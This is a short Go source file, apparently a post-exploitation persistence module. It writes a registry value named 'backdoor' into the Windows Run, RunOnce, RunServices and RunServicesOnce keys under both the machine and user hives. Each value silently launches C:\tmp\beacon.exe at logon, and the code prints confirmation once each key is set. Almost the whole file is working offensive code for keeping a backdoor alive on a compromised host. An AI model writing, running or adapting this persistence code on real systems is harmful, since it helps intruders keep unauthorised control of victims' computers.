package alive

import (
	"fmt"

	"golang.org/x/sys/windows/registry"
)

// RegistryPaths 包含不同注册表路径的常量
var RegistryPaths = map[string]string{
	"Run":             `Software\Microsoft\Windows\CurrentVersion\Run`,
	"RunOnce":         `Software\Microsoft\Windows\CurrentVersion\RunOnce`,
	"RunServices":     `Software\Microsoft\Windows\CurrentVersion\RunServices`,
	"RunServicesOnce": `Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`,
}

// QueryRegistryValue 查询注册表键值
func QueryRegistryValue(k registry.Key, keyPath, name string) (string, error) {
	key, err := registry.OpenKey(k, keyPath, registry.SZ)
	if err != nil {
		return "", err
	}
	defer key.Close()

	value, _, err := key.GetStringValue(name)
	if err != nil {
		return "", err
	}

	return value, nil
}

// CreateRegistryKey 新增注册表键值
func CreateRegistryKey(k registry.Key, keyPath string, valueName string, data string) error {
	key, _, err := registry.CreateKey(k, keyPath, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	err = key.SetStringValue(valueName, data)
	if err != nil {
		return err
	}

	return nil
}

func RunRegs() {
	keyName := "backdoor"
	cmdStrings := `cmd.exe /c start /b C:\tmp\beacon.exe`

	for _, path := range RegistryPaths {
		err := CreateRegistryKey(registry.LOCAL_MACHINE, path, keyName, cmdStrings)
		if err != nil {
			fmt.Println("[-] CreateServerRegistryKey:", err)
			continue
		}

		err = CreateRegistryKey(registry.CURRENT_USER, path, keyName, cmdStrings)
		if err != nil {
			fmt.Println("[-] CreateUserRegistryKey:", err)
			continue
		}

		serverValue, err := QueryRegistryValue(registry.LOCAL_MACHINE, path, keyName)
		if err != nil {
			fmt.Println(err)
			continue
		}

		userValue, err := QueryRegistryValue(registry.CURRENT_USER, path, keyName)
		if err != nil {
			fmt.Println(err)
			continue
		}

		fmt.Println("[+] Set serverValue Successfully:", serverValue)
		fmt.Println("[+] Set userValue Successfully:", userValue)
	}
}
